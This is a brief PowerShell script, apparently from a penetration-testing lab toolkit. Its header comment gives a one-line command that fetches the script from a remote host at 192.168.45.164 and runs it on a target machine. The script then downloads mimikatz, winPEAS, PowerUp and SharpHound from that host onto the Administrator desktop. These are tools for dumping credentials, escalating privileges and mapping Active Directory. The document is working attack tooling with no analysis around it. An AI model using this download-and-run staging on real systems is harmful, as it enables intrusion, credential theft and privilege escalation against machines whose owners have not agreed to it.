#This script is to be used from another machine.
#Allows to download multiple files at once
#usage on target: 
## On powershell -> IEX(iwr -uri http://192.168.45.164/multi-download.ps1 -usebasicparsing)



$baseurl = "http://192.168.45.164/"
$fileNames = @("mimikatz.exe", "winPEASany.exe","PowerUp.ps1", "Sharphound.ps1")
$downloadPath = "C:\Users\Administrator\Desktop"

foreach ($fileName in $fileNames)
{
    $url = $baseurl + $fileName
    $filePath = Join-Path $downloadPath $fileName
    Invoke-WebRequest -Uri $url -OutFile $filePath
    Write-Host "Downloaded $fileName to $filePath"
}